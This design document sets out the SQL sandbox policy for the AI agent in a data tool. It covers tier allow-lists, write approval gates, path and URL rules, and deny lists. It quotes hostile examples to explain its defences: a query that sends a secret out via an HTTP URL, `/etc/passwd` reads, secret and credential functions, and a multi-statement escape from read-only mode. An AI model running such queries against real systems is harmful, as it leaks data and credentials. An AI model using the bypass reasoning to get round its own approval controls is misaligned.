# The agent's SQL policy

> This is the policy of vibe-app#116 (plan §4.5), as built. It replaced the old deny-list: the agent's SQL is an **allow-list per tier**, and the person's own SQL in the query editor (Studio's editor, `slaw query` and the terminal UI) is not covered by it. Notebook `sql` cells and live A2UI bindings are not your own SQL in this sense, even when you wrote the cell: they re-run on open and on every render, so they always run under the read-only form of this policy. The same policy applies to Studio's agent chat, to `slaw mcp serve` and to Studio's MCP server; there is one tool surface.

The agent (Studio chat or an MCP client) reaches data through `run_query` and the record and schema tools. Every statement goes through four layers, cheapest and least side-effecting first:

1. **Statement split.** DuckDB's own `duckdb_extract_statements` is the authority on how many statements there are. The policy's lexer must agree with it, or the query is denied ("couldn't verify this query"). Every statement of a script is checked.
2. **A syntactic check before any `EXPLAIN`.** Binding has side effects: `EXPLAIN SELECT * FROM read_csv('https://x/?q=secret')` would sniff the file and send an HTTP request, so the classifier's own `EXPLAIN` could exfiltrate. A `SELECT`-shaped statement is parsed by DuckDB (`json_serialize_sql`) on a **separate, hardened, in-memory DuckDB with `enable_external_access=false`**, never the hub, and its AST is walked; every other statement is checked on its tokens. Both enforce the never-list, the table-function allow-list and the literal-path rule. A parse failure is a denial.
3. **A plan-operator allow-list** (`EXPLAIN (FORMAT JSON)` on the real connection, only after step 2): the second layer. It sees through views and macros that wrap a denied function, and refuses any operator it does not know. A plan may contain no more file/URL readers than the statement wrote out and vetted.
4. **Write gates** (below).

## What each tier allows

The tier is the person's `sandbox` setting, clamped to the team limit in `slaw.yaml` (see [workspaces.md](workspaces.md#the-agent-limit)).

| | `read-only` | `read-write` (default) | `full` |
|---|---|---|---|
| `SELECT`, `WITH`, `FROM`-first, `VALUES`, `TABLE`, `DESCRIBE`, `SHOW`, `SUMMARIZE`, `EXPLAIN` (never `ANALYZE`), allow-listed `PRAGMA` and `CALL`, over **any attached catalog** including remote ones (`pg.public.t`) | yes | yes | yes |
| Files and URLs, only as the policy's rules below allow | yes | yes | yes |
| `INSERT`, `UPDATE`, `DELETE`, `MERGE`, `INSERT ... ON CONFLICT` into a writable catalog | no | yes | yes |
| `CREATE`, `DROP`, `ALTER` of tables, views, sequences, schemas, indexes, macros, types on a writable catalog | no | no | yes |
| `COPY (...) TO '<literal path in data/>'` | no | no | yes |
| Content tools: `add_query_cell`, `add_markdown_cell`, `update_cell`, `delete_cell`, `move_cell`, `create_dashboard`, `create_or_update_skill`, `write_artifact`, `save_query`, `build_query`, `propose_definition`, `write_watch` (workspace files, not data; `propose_definition` files a proposal in `.slaw-local/proposals/` and changes nothing in `semantics/`) | no | yes | yes |
| Everything in the never-list | no | no | **no** |

Record tools follow the same tiers. `create_record`, `update_record`, `delete_record` and `bulk_insert` are data tools. `create_table`, `add_column`, `drop_table` and `import_csv` are schema tools, so they need `full`. `build_query` and `save_query` write a named query into `queries/`; they are content tools like `write_artifact`, so `read-write` may use them, and their SQL is held to the read-only policy at save (see [mcp.md](mcp.md#saved-queries)). `run_saved_query` runs a saved query by id through `run_query`'s read gates, reads only. `propose_schema` only shows a draft schema in chat and changes nothing. The read-only helpers `list_notebooks`, `get_notebook`, `preview_query`, `list_queries`, `run_saved_query`, `list_definitions`, `get_definition`, `list_skills` and `help_search` are introspect tools, allowed in every tier. `propose_definition` is a content tool, so `read-write` and `full` may file a proposal for a semantic definition and `read-only` may not; it never asks first, even when "Ask before changes" is on (the inbox is the gate: nothing changes until the person accepts, and the inbox is capped), and no tool at any tier can accept, reject or write a definition under `semantics/`: the agent holds a read-only view of the semantic store and an inbox that can only add (see [semantics.md](semantics.md#proposals-an-agent-suggests-you-decide)).

### Watches

`write_watch` writes `watches/<name>.yaml` and is a content tool like `write_artifact` and `save_query`: refused under `read-only`, and it asks first when "Ask before changes" is on. When nobody can approve (headless MCP) it is validated before the gate: an invalid request, or a watch over a saved query or metric that does not exist, gets its own error, and a valid one is answered "valid and ready, NOT saved" with the canonical `file` and any `warnings`. With an approver (Studio) the card comes first, as for the other content tools, and shows the canonical file (params and description included); an invalid request is refused after the OK, with nothing written. `list_watches` and `get_watch` are introspect tools, allowed in every tier. **No tool checks a watch**: the agent holds the check history through a read-only view and sees a status and a time, never a reason, a value or a row (see [watches.md](watches.md#agent)).

### Data artifacts

`write_artifact` stores a [data artifact](artifacts.md) (`artifacts/<name>/artifact.yaml` and `view.a2ui.json`, or `view.js` for `view: script`, sent as `view_source`) and is a content tool: refused under `read-only`, and it asks first when "Ask before changes" is on (the approval card says "Save data artifact NAME"). `list_artifacts` and `get_artifact` are introspect tools, visible in every tier and over MCP; they return the manifest and view as data (a query over 4,000 characters comes back with `sql: null` and `sql_omitted: true`, never a prefix, and is kept on a rewrite with `keep_sql: true` (valid only with a `rev` and a stored query of that name); a very large view is summarised), never results. **No tool runs an artifact for the agent**, so an artifact cannot widen what the agent's own `run_query` could read; Studio runs its queries for the person.

**The agent can write a custom view but never allow one.** A `view: script` artifact's `view.js` is model output, so it runs nothing until the person allows it in Studio (or `slaw artifact view allow`). No tool, MCP method or other agent-reachable path allows, denies or revokes; the decision lives in `views.json` in the person's config directory, outside the workspace and bundles, and is keyed by the folder's path plus a hash of `artifact.yaml` and `view.js`, so every agent edit asks again. The approval card for the write says "with a script view (it stays inert until you allow it)". Tests: no tool name or parameter mentions allow, deny, revoke, trust or a hash, and MCP `tools/list` shows none.

**An HTML page is content to the agent, never something it runs.** With `view: html`, `write_artifact` takes the page's text files as `html_files` and `get_artifact` returns them (each file whole, or `text: null` with `text_omitted: true` when over the cap, never a prefix; binary assets by size only). The files are held to the page rules at save (file layout, closed template functions, the URL allow-list) and to the same read-only SQL policy for the manifest's queries. **No tool renders a page, runs one of its queries or shows the agent a result**, and none allows, denies or revokes: the page's decision is the person's, keyed by path and `PageHash`, so every agent edit asks again. A page's `ask` capability is a single completion on the person's provider with no tools, never the agent's registry. The approval card says "with an HTML page (it stays inert until you allow it)".

**Artifact queries are read-only in every tier, and are vetted at save and at every run.** Each query goes through the same read-only gate as a notebook sql cell (a single statement that classifies as a read; the fixed "live bindings are read-only" refusal at run), plus two lexical checks on the policy's own lexer: a query is exactly one statement, and every `$name` is a parameter token (not text inside a `'...'`, `"..."`, `$$...$$` or a comment, and no bare `?` or positional `$1`); and a parameter is never an argument of `query(...)`, `query_table(...)` or a file reader. A value only ever becomes a prepared-statement argument. At save the queries are checked with every parameter at its default, on the connection each names (an unknown connection, or a storage connection with no catalog, is refused); a refusal names the query and the policy's reason. At run the artifact is loaded from the store, the same checks repeat (a file edited by git, an editor or a bundle never passed the vet), and the policy classifies the statement with the actual values. Both go through one function, so a statement is vetted by the code that later runs it. The run is read-only in **every** tier: a hand-edited write statement, `read_text('/etc/passwd')` and the like are refused at run under `read-only`, `read-write` and `full` alike (an end-to-end test in `internal/hub` covers all three; over MCP, where no tool runs an artifact, the same statements are refused at `write_artifact`).

**An agent write never replaces a version it did not read.** `write_artifact` and `create_or_update_skill` without a `rev` only create: an existing name is refused. To replace one, send the `rev` that `get_artifact` / `list_artifacts` (or `read_skill` / `list_skills`) returned; if it changed since, the write is refused and nothing is written. The store's own last-seen revision is never used in its place.

## Writes need three gates

A write runs only when **all three** hold:

1. **The tier allows it** (table above).
2. **Every connection it changes is writable** (`read_only: false`, and DuckDB itself reports the catalog writable). The target catalogs come from the SQL (`INSERT INTO other.orders` targets `other`; the unqualified name targets the default connection; a two-part name `x.t` is a schema of the default connection or a catalog `x`, so both are checked; `CREATE TEMP TABLE` targets `temp`; `CREATE INDEX` targets its table's catalog). A script's targets are the union over its statements. A read-only connection refuses the write in every tier, naming it, and nothing is asked.
3. **The person approves it.** "Ask before changes" is the person's setting (committed `slaw.yaml` can force it on, never off), **and it is forced on for any connection that is not a local file**: Postgres, MySQL, MotherDuck, DuckLake (it writes Parquet files and snapshots others see) and anything else other than the workspace's own `duckdb`/`sqlite` files. That holds whatever the person's loosening.

There is no approver on headless `slaw mcp serve`, so it **refuses writes to non-local connections** with this message (and nothing is changed):

> run_query changes pg, which is not a local file in this workspace, so it always needs your OK in Slaw (even when "Ask before changes" is off), and there is no one to ask over MCP. Nothing was changed. Open the workspace in Slaw: with its MCP server on, `slaw mcp serve` passes through to it and Studio shows you an approval card, or make the change from Studio's agent chat.

A content write (`write_artifact`, `add_query_cell`, `add_markdown_cell`, `update_cell`, `delete_cell`, `move_cell`, `create_dashboard`, `create_or_update_skill`, `save_query`, `build_query`) that needs an approval nobody can give is **validated first** (for `create_dashboard` and `update_cell` with a `page` that includes the SQL vet of every `sql`-bound component; for the three that change existing cells, a stale or missing notebook `rev`): every check the write makes runs with nothing written (a dry run inside the handler, so the two paths cannot drift), and only then is the approval asked for. An invalid request gets its own validation error. A valid one gets:

> write_artifact: your request is valid and ready, but it was NOT saved yet. It writes artifacts/sales/ in the workspace folder. Sandbox: read-write ("Change rows", allows this). Ask before changes: on (this is what stopped it), and there is no one here to approve over MCP. Nothing was written. Ask the person to approve it: ... or they can turn off "Ask before changes" (the switch "Ask me before it changes data" in Slaw → Settings → Workspace → The Slaw assistant → On this computer) and then you can send the same call again.

with `structuredContent {"valid": true, "needs_approval": true, "nothing_written": true}` over MCP (plus the vet's result columns: `queries` for `write_artifact`, `columns` for `save_query` and `build_query`; see [mcp.md](mcp.md)). The data variant (`run_query`, records and the like) says it changes data in the workspace's local database and names the same switch. A refusal for the tier names the tier needed and where it is changed (`internal/agents/approval_text.go`). When an approver is present the card is shown before the write, as always.

Through Studio (chat, or MCP proxied to Studio) the approval card says which non-local connections the statement changes. The policy is checked again after you approve, in case the tier or the connection changed while the card was open.

### Column definitions in `create_table` and `add_column`

The `type` of a column is DDL text, not a quoted value, so the agent's is checked against a closed grammar (`crud.CheckAgentColumnType`): a DuckDB type, plus `PRIMARY KEY`, `NOT NULL`, `UNIQUE`, `REFERENCES t(col)` and `DEFAULT <literal>`. A default literal is a number (`0`, `-5`, `1.5e3`), a single-quoted string (`'abc'`, `'it''s'`), `TRUE`, `FALSE`, `NULL`, `CURRENT_TIMESTAMP` or `CURRENT_DATE`. A function call, operator, cast or parenthesised default (`DEFAULT concat('a','b')`, `DEFAULT 1+1`, `DEFAULT nextval('s')`), `CHECK`, and generated columns (`AS (...)`, `GENERATED`) are refused with a message that lists what is allowed, over MCP as well. The table designer in Studio and the CLI keep the wider `crud.ValidColumnType` check for people.

## `metric()` is expanded before the policy

A call such as `metric('net_revenue', by => 'region')` (see [semantics.md](semantics.md#using-a-metric-in-sql)) is replaced by a `SELECT` over the metric's saved query **before** anything below runs, in every path that checks SQL (`run_query`, `run_saved_query`, `preview_query`, `write_cell`, notebook cells, A2UI bindings, artifact queries). The policy then classifies, vets paths and binds with `EXPLAIN` exactly the text that will run, with the same tier, connection and approval rules; a saved query behind a metric that reads a file outside `data/`, or is no longer one read, is refused like any statement, with `metric 'name': ` in front of the policy's reason. `metric` is **not** a DuckDB function and is on no allow-list: text that reaches the policy still holding a `metric(` call fails to bind. Wildcard expansion (below) runs after it.

## Files and URLs

A file or URL is read only when it is written out as a **plain string literal** in a reader, and:

- **File**: an absolute path, no `..`, that after resolving symlinks lies **inside the workspace's `data/` folder**. Relative paths are refused (DuckDB resolves them against the process's working directory, which is not the workspace); the error names the `data/` folder's absolute path, and so does `list_connections`. A glob (`data/*.csv`) is accepted when its literal directory prefix is inside `data/` and no symlink under it points out of `data/`. A symlink inside `data/` that points out is refused.
- **URL**: only a URL that starts with the **scope** of a **ready storage connection** (s3, gcs, r2, azure; status `ok` or `not-connected`, not one that needs credentials or failed). One shared normaliser (`internal/storageurl`, also used when a workspace is opened and when a connection is saved) decides what a URL is: a known storage scheme (`s3://`, `s3a://`, `s3n://`, `gcs://`, `gs://`, `r2://`, `az://`, `azure://`, `abfss://`) written in lower case, with **no query string or fragment, no percent-escape (so `%2e%2e` is no way round `..`), no backslash, space or control character, no glob character (`[` `]` `{` `}` `!` are refused: DuckDB would read `a[1].db` as `a1.db`), and no `*` either, except in an Azure read (`az://`, `azure://`, `abfss://`): the session reads an `s3`, `gcs` or `r2` URL as one literal key so that no URL can carry a different endpoint for the connection's credential (#138, [connections.md](connections.md)), so a `*` there is **expanded by Slaw before the policy looks at the statement** (see *Wildcards on s3, gcs and r2* below) and a `*` that is still in such a URL afterwards is refused, no `.` / `..` segment and no empty segment (`//`)**. The match is then a literal, case-sensitive prefix. Every scope is treated as a folder and gets a trailing `/` (`s3://bucket` never admits `s3://bucket-evil/`, and `az://events/2024` never admits `az://events/2024-evil/`). A scope whose scheme is not a storage scheme (`file:///`, `http://`, `hf://`) widens nothing, and **only a storage connection (s3, gcs, r2, azure) exports a scope at all**: a `delta`, `iceberg` or `ducklake` connection with a `scope` in its definition is refused when it is saved and exports nothing if it got in by hand-editing. `https://`, `http://`, `file://`, `hf://` and the rest are never readable. Aliases are never guessed at: `gs://` does not match a `gcs://` scope, and for Azure the scheme must be the one the scope was written with (`az://`, `azure://` and `abfss://container@account.dfs.core.windows.net/` are three different strings to the policy).
- **A path is one plain literal, or a list of plain literals** (`read_parquet(['s3://b/a.parquet', 's3://b/b.parquet'])`, which is what a wildcard on s3, gcs or r2 expands to): every string in the list is vetted on its own, by the rule above. A list that holds anything but plain string literals, or an empty list, is refused, and so is the list form whenever a user macro named `list_value` or `list_pack` exists (the bracket syntax is a call to `list_value`, so the macro would decide what is read). For the same reason the agent cannot create a macro or function named like a DuckDB function (`list_value`, `read_text`, `glob`, ...), and a reader whose name a user macro has replaced is refused. A `TEMP` macro or function lives only for the run that created it: a hub connection that still holds one is discarded instead of going back to the pool, so the policy never checks one connection while the query runs on another that has a different `list_value` (TEMP tables and views are unaffected).
- **Not a literal**: `getvariable(...)`, concatenation (`'a' || 'b'`), casts, columns, lists of anything but plain literals, a second positional path, parameters, `E'...'`, `$$...$$`, `U&'...'` and adjacent literals (`'a' 'b'`, which SQL concatenates) are all refused as paths.
- The bare forms are readers too: `FROM 'file.csv'`, `DESCRIBE 'file.csv'`, `SUMMARIZE 'file.csv'`, and `FROM s.csv` (DuckDB joins the parts into a file name) get the same rule. A name that is an existing table is a table.
- Reads inside views and macros are held to the same rule: a view or macro whose body reads a file outside `data/`, calls a denied function, or passes a parameter into a reader is refused when the agent uses it (the plan layer also counts readers).
- `COPY ... TO` may write only an absolute, glob-free path inside `data/` whose parent exists, and never a database, WAL or extension file (`.duckdb`, `.ducklake`, `.db`, `.wal`, `.sqlite`, `.duckdb_extension`, ...), nor a symlink, nor anything in a connection's own files: the catalog file of a DuckLake and its whole data folder, and any duckdb or sqlite connection file, whatever it is called. `COPY ... FROM` (a file, or `FROM DATABASE`) is refused: load a file with `INSERT INTO t SELECT * FROM read_csv('<path in data/>')`.

### AWS SSO sign-in changes nothing the agent can read

A connection that signs in with `aws-sso:PROFILE` is a storage connection like any other: the agent reads only URLs inside its scope, only while it is ready, and an expired or missing session makes it *not ready* (the refusal names the connection and says to sign in). The keys never enter the agent's context: `duckdb_secrets()`, `which_secret()`, `getenv()` and readers over `~/.aws` (the SSO token cache and config), which is outside `data/`, are refused at every sandbox tier, MCP included. The agent cannot start a sign-in.

### Wildcards on s3, gcs and r2

Slaw lists the objects of a pattern itself (`internal/storageglob`, [connections.md](connections.md)) and rewrites the statement to an explicit list. For the agent that happens **before** the policy: (1) each pattern is checked, before anything is listed, as a plain `s3`, `s3a`, `s3n`, `gcs`, `gs` or `r2` URL (only `*` and `**` are wildcards; `?`, `[`, `{`, `!`, `%`, `#`, spaces and `..` are refused) whose text **starts with the scope of a ready storage connection** (a pattern no ready scope covers is refused as a permission error and never listed); (2) the matching objects are listed in a private session that holds only that connection's secret, capped at 10,000 per statement (more is an error naming the pattern; none is `no files found that match the pattern ...`); every name must be a plain URL (a name with a control character, space, `?`, `#`, `%` or `*` is refused with a count, never read); `glob()` with no match is `no files found ...` too; (3) the policy then runs on the **expanded** statement: every key is vetted against the scopes like any literal, the syntactic layers and `EXPLAIN` run on it, and that expanded text is what runs. Approval cards, the editor and notebook cells keep the pattern. The listing is a point in time. A notebook or A2UI cell keeps its wildcard and is expanded each time it runs. Patterns are expanded only where DuckDB would glob them (a reader's first argument, `glob()`, `FROM '...'`); a statement shape that is not expanded leaves the `*` in place, and it is refused (`was not expanded`).

### Allowed readers

`read_csv`, `read_csv_auto`, `read_parquet`, `parquet_scan`, `parquet_metadata`, `parquet_schema`, `parquet_file_metadata`, `parquet_kv_metadata`, `read_json`, `read_json_auto`, `read_ndjson`, `read_ndjson_auto`, `read_json_objects`, `read_json_objects_auto`, `read_ndjson_objects`, `read_text`, `read_blob`, `glob`.

**Reader options.** Only an explicit list of parsing options may follow the path: `header`, `delim`, `delimiter`, `sep`, `quote`, `escape`, `columns`, `union_by_name`, `auto_detect`, `all_varchar`, `skip`, `null_padding`, `ignore_errors`, `sample_size`, `dateformat`, `timestampformat`, `types`, `dtypes`, `names`, `normalize_names`, `filename`, `hive_partitioning`, `hive_types`, `hive_types_autocast`, `format`, `records`, `maximum_object_size`, `compression`, `newline`, `comment`, `decimal_separator`, `encoding`, `binary_as_string`, `file_row_number`, `parallel`, `auto_type_candidates`, `nullstr`, `strict_mode`, `max_line_size`, `buffer_size`, `maximum_depth`, `field_appearance_threshold`, `map_inference_threshold`, `convert_strings_to_integers`, `thousands`. Any other (`rejects_table`, `store_rejects`, `version_name_format`, `allow_moved_paths`, ...) is refused ("not on the agent's list of safe reader options"), in both `name = value` and `name := value` forms.

**Iceberg and Delta are agent readers (changed 2026-11-07; they were refused, vibe-app#119 review).** `iceberg_scan`, `iceberg_metadata`, `iceberg_snapshots` and `delta_scan` are allowed in every tier and take exactly the `read_parquet` rules, through the same code: one plain string literal (or a list of them) inside `data/` or a ready storage connection's scope, the URL and glob rules, the safe-option list, and the plan check counting each as a file reader (`ICEBERG_SCAN`, `ICEBERG_METADATA`, `ICEBERG_SNAPSHOTS` and `DELTA_SCAN` are reader plan operators; the extension must be loaded for `EXPLAIN` to bind them). **Warning: Table metadata in this lake decides which files DuckDB reads. Anyone who can write it can make a query read local files or other storage your connections cover.** A table's own metadata names the files it reads (`_delta_log` `add.path` with `../` or an absolute path, a `file://` or `http://` URL, a manifest list URL), so a path check on the literal cannot confine what a crafted table reads. That is accepted: the tool runs what DuckDB runs, and the connection form, `slaw conn` and bundle import warn where a shared definition of such a connection appears. The options that redirect metadata lookup (`version_name_format`, `allow_moved_paths`, ...) are not on the safe-option list and stay refused. `COPY ... TO` still refuses a path under a `_delta_log` folder, a file ending `metadata.json` or `.avro`, and `version-hint.text`, so the agent does not write the metadata of a table it then reads.

Not allowed (no path rule can make them safe here): `sniff_csv`, `parquet_bloom_probe`, `read_xlsx`, `st_read`, `iceberg_*` other than the three readers above, `sqlite_*`, `mysql_*`, `postgres_*`.

## Allowed table functions (besides the readers)

`range`, `generate_series`, `unnest`, `generate_subscripts`, `duckdb_tables`, `duckdb_columns`, `duckdb_views`, `duckdb_schemas`, `duckdb_constraints`, `duckdb_indexes`, `duckdb_sequences`, `duckdb_keywords`, `duckdb_functions`, `duckdb_types`, `pragma_table_info`, `pragma_storage_info`, and DuckLake's read-only metadata functions (#119) `ducklake_snapshots`, `ducklake_current_snapshot`, `ducklake_last_committed_snapshot`, `ducklake_table_info`. Any other table function is refused ("not on the agent's allow-list"), including every extension's: the rest of `ducklake_*` (`ducklake_set_option`, `_expire_snapshots`, `_merge_adjacent_files`, `_rewrite_data_files`, `_cleanup_old_files`, `_delete_orphaned_files`, `_add_data_files`, `_flush_inlined_data`, `_set_commit_message`, `_options`, `_list_files`, `_table_insertions` / `_deletions` / `_changes`) changes the lake or shows where its files live, and a catalog-qualified form (`lake.snapshots()`, `CALL lake.set_option(...)`) is refused too. A table macro an owner defined is allowed when its body passes the same rules.

**Table-name arguments are table references.** `pragma_table_info`, `pragma_storage_info`, `PRAGMA table_info` / `storage_info` and `CALL pragma_table_info` take a table name as a string, and DuckDB resolves it like a `FROM` item. The policy therefore requires exactly one plain string literal, splits it as a (quoted) dotted name, and runs it through the same reference checks as a table in `FROM`: a DuckLake's internal metadata catalog, a MySQL server schema and the `pg_catalog` views are refused, an unknown table is refused. Without that, `storage_info` statistics would show value prefixes (including data paths) of tables a direct `SELECT` cannot read.

## Allowed `CALL`

`CALL` takes literal arguments only and only these: `duckdb_tables`, `duckdb_columns`, `duckdb_views`, `duckdb_schemas`, `duckdb_constraints`, `duckdb_indexes`, `duckdb_sequences`, `duckdb_keywords`, `duckdb_types`, `pragma_table_info`. `CALL read_text(...)`, `CALL glob(...)`, `CALL postgres_execute(...)`, `CALL pg_clear_cache()` (Slaw refreshes remote catalogs itself) and the rest are refused.

## Allowed `PRAGMA`

`table_info`, `show_tables`, `show_tables_expanded`, `database_size`, `storage_info`, `version`, `platform` (literal arguments only). `database_list` is not on the list: it exposes file paths.

## Never, in any tier

Refused in `full` too, and no approval can lift them:

- `ATTACH`, `DETACH`, `USE` (connections come from the workspace; name the connection in the table instead).
- Secrets: `CREATE`/`DROP SECRET`, `duckdb_secrets()`, `which_secret()`, `duckdb_secret_types()`, anything that names a secret (the vibe-app#114 rule, now also enforced on the AST).
- `SET`, `RESET`, `PRAGMA` writes. **`SET VARIABLE` is refused entirely** (spike finding D: it runs subqueries and table functions, so a constant-only form was not worth the surface; `getvariable()` stays callable but can never name a path).
- `INSTALL`, `LOAD`, `FORCE INSTALL`, `UPDATE EXTENSIONS`, with or without a path.
- `EXPORT DATABASE`, `IMPORT DATABASE`, `COPY FROM DATABASE`, `COPY ... FROM`.
- `EXPLAIN ANALYZE` (it executes the statement; `EXPLAIN` of a write is refused too), `PREPARE`/`EXECUTE`, transactions, `CHECKPOINT`, `VACUUM`, `ANALYZE`, `TRUNCATE`, `COMMENT ON`, `GRANT`/`REVOKE`.
- `CREATE`/`DROP`/`ALTER DATABASE`, `CREATE SHARE`, `CREATE EXTENSION`, and any DDL kind not listed above.
- Raw passthroughs: `postgres_query`, `postgres_execute`, `postgres_scan` (inline DSN), `postgres_attach`, `postgres_scan_pushdown`, `mysql_*` (`mysql_query`, `mysql_execute`, `mysql_clear_cache`, `mysql_scan`, `mysql_attach`: the mysql extension adds exactly the first three, checked against `duckdb_functions()` in the integration test), `sqlite_*`. `postgres_execute` escapes `READ_ONLY` with a multi-statement payload (spike vibe-app#107), and the mysql ones run raw SQL on the server, so these are refused outright.
- DuckLake's own bookkeeping: the catalog `__ducklake_metadata_<name>` that DuckLake attaches beside every lake (DuckDB or SQLite kind) is neither readable nor writable (it names every data file, and a write corrupts the lake), and rows naming it never appear in a result (`duckdb_tables()`, `SHOW ALL TABLES`, ...). This hides the lake's tables, not the catalog *file*: a catalog in object storage is readable with `read_blob` / `read_text` exactly where a storage connection's scope you chose covers its URL (the lake adds no scope), and `sqlite_scan` of a SQLite catalog file is refused (not on the allow-list).
- The MySQL server's own schemas in a MySQL catalog: `shop.mysql.user` (password hashes), `shop.performance_schema.*`, `shop.sys.*` and the server's `shop.information_schema.*`. DuckDB's own `information_schema` is unaffected. Query the connection's own database.
- `query()` and `query_table()` unless their argument is one plain string literal; the SQL or name it carries is then checked as a read. `json_execute_serialized_sql()` always.
- MotherDuck sharing and administration: every function named `md_*`, `__md_*`, `motherduck_*`, `non_md_*`, `get_md_token`, `print_md_token`, and the AI functions `prompt*` and `embedding` (they send data to a remote service). Checked against `duckdb_functions()` after `LOAD motherduck`: the extension adds `MD_*` table and scalar functions, `GET_MD_TOKEN`, `PRINT_MD_TOKEN`, `PROMPT*`, `EMBEDDING` and internal `__MD_*` ones.
- Settings and the environment: `duckdb_settings()`, `current_setting()`, `getenv()`, `duckdb_extensions()`, `duckdb_variables()`, `duckdb_logs`, `duckdb_temporary_files()`, `duckdb_external_file_cache()`, `sql_auto_complete()`, the other internal `duckdb_*` state functions, and any function starting `__`.
- `duckdb_databases()` and `pragma_database_list()` (they expose file paths): use `list_connections`. `SHOW DATABASES` is refused for the same reason.
- `nextval()` / `setval()` in a read (they change a sequence); `INSERT ... DEFAULT nextval(...)` is a write.
- `SUMMARIZE` over a remote catalog (it copies the whole table out of the server); `DESCRIBE` is catalog-only and allowed.

## The string net

For statements the policy checks on tokens (`INSERT`/`UPDATE`/`DELETE`/`MERGE`, `CREATE`/`DROP`/`ALTER`, `COPY`, and view and macro bodies), every string literal and quoted identifier must, before any `EXPLAIN` binds the statement, be either a file or URL the policy already accepted as a reader path, or **inert**: no scheme (`://`, `s3:/`, a drive letter), not starting with `/`, `~`, `./`, `../` or `\\`, and not ending in a data-file extension (`.csv`, `.parquet`, `.json`, `.db`, ...). Otherwise the statement is refused ("a file or URL here can't be checked"). It does not depend on knowing every place SQL can name a table source, so an unknown form cannot make the classifier's own `EXPLAIN` read a file or send a request.

It is blunt on purpose, so **inserting or updating path- or URL-looking values (`'/etc/passwd'`, `'report.csv'`) is refused**: that needs the user, or a reader on a path inside `data/`. `'N/A'` and `'a/b'` are fine.

It does **not** apply to read-only (`SELECT`-shaped) queries: there the parsed AST is authoritative, a string constant is never a table source, and every source form (`FROM`, `JOIN`, `PIVOT`, `UNPIVOT`, `TABLE`, replacement scans, table functions) is a node that is vetted. `WHERE path = '/home/x/a.csv'`, `LIKE 'https://%'`, `LIKE '%.csv'` and `regexp_extract(path, '/([^/]+)$', 1)` all work.

**`PIVOT`/`UNPIVOT` as a statement** (`PIVOT t ON a USING sum(b)`, `UNPIVOT t ON a INTO NAME m VALUE v`, `CREATE TABLE x AS PIVOT ...`) is refused with a reason that names the working form: DuckDB expands the statement into several. Use `SELECT * FROM t PIVOT (sum(b) FOR a IN (...))` or `FROM t UNPIVOT (v FOR m IN (a, b))`, which work.

## What the agent is told when a statement fails

Messages are written so the agent can fix the statement in one more call (#222):

- **The agent sees its own SQL.** The policy checks a statement with `EXPLAIN (FORMAT JSON) <sql>`; a binder error quotes that line, and the wrapper is removed from the message (the caret is moved with it).
- **Keyword aliases.** `SELECT count(*) days` is a DuckDB parser error. When the error names a word and the parser, asked again with `AS` written before that word, gets past it, the message adds a fixed hint to write `AS days` or quote it. The retry only parses (`duckdb_extract_statements`, no binding, on the hardened parser connection); a word is never matched against a keyword list, and any other syntax error gets no hint.
- **Parameters are named.** `run_query.params` is `{name: value}` with `$name` in the SQL. A bare `?` is refused with that instruction, and so is a `$name` inside a string literal or comment (it is not a parameter). A parameter reaches the planner untyped, so `date_trunc('month', $from)` fails with "Could not choose a best candidate function"; the message adds a hint to cast it (`$from::DATE`).
- **`sql` must be a string.** A number, array or object is named as such (`sql must be a string ... (got a number)`) instead of "the statement is empty".
- **A script returns its last statement's result only.** `run_query` refuses a script with a read before its last statement (`SELECT 1; SELECT 2`), because that result would be dropped without a word; send each SELECT as its own call. Writes may still be scripted (every statement is classified, the targets are the union, and the refusal happens before anything runs), ending in the read that shows their effect. A single trailing semicolon is fine. Classification itself is unchanged: notebook cells, live bindings and artifact queries have their own one-statement rules.
- **The empty-result note names the right table** (#216). For a result with no rows, or an ungrouped `count(*)` of 0, whose statement compared a column with string literals, the note lists the values the column holds. The statement is parsed by DuckDB and each column is resolved against the tables the statement itself reads, catalog-qualified: through its alias (`FROM races r WHERE r.name = ...`) or its table name, or, for a bare column, only when exactly one of those tables has it. The value probes read only local duckdb or sqlite catalogs (never a Postgres, MySQL, MotherDuck or lake connection) and share a 4 second deadline. A column that is ambiguous, that belongs to a subquery, CTE or table function, or that cannot be found gets no note.

## `list_connections`

An introspect tool, visible in every tier, over MCP too: for each registered connection its `name`, `type`, `status`, `read_only`, `location` (`local` or `remote`), `catalog` (false for a storage connection) and, for storage, its `scope` (a `delta` or `iceberg` table connection has none: it widens nothing); plus the default connection and the absolute path of the workspace's `data/` folder. It never returns a host, a DSN, a credential or a path outside the workspace. `introspect_schema(connection?)` and `describe_table` take catalog-qualified names (`catalog.schema.table`); an agent-authored notebook cell (`add_query_cell`, `write_cell` after `preview_query`) may carry a `connection`, validated against the registered names and classified on that connection.

## Limits worth knowing

- **A script whose later statements depend on earlier ones** (`CREATE TABLE a (...); INSERT INTO a ...`) cannot be verified, because each statement is checked against the database as it is before the script runs. Send them as separate calls.
- **The `PIVOT` and `UNPIVOT` statements** (as opposed to `FROM t PIVOT (... IN (...))` and `FROM t UNPIVOT (...)`) expand into several statements inside DuckDB and are refused, with the working form in the message.
- **`pg_catalog` views are refused** (`pg_catalog.pg_tables`), with a message that points to `information_schema.tables`, `duckdb_tables()`, `SHOW TABLES` and `list_connections`. They were considered for the allow-list: `pg_tables` is `duckdb_tables()` without its `database_name` column and exposes no path, but without that column the scrub that hides a DuckLake's internal catalog (it keys on the catalog name) could not see those rows, so the closed list keeps to the views that carry it.
- **`CREATE TEMP TABLE` needs the full tier**, like every `CREATE` (decision for #222, behaviour unchanged). A TEMP object changes no connection, but it lives in the hub's one in-memory catalog, which every later query shares, the person's notebooks and artifacts included, and a temp table named like a real table shadows it there. Its refusal under `read-write` says so and suggests a CTE or subquery (the note is carried by the verdict's `Temp` flag, not its reason, so notebook refusals do not repeat it).
- **Unqualified or schema-only names** cost one listing of the catalogs (two round trips for an attached Postgres); a fully qualified name in a Postgres catalog does not.
- **Files can change between the check and the read.** A symlink swapped into `data/` in that window is not caught; the folder is yours.
- **`read_only` is a client-side guard.** Use a read-only database role for anything the agent must not change; the policy refuses `postgres_execute`, but a role that can write can be reached by other means.
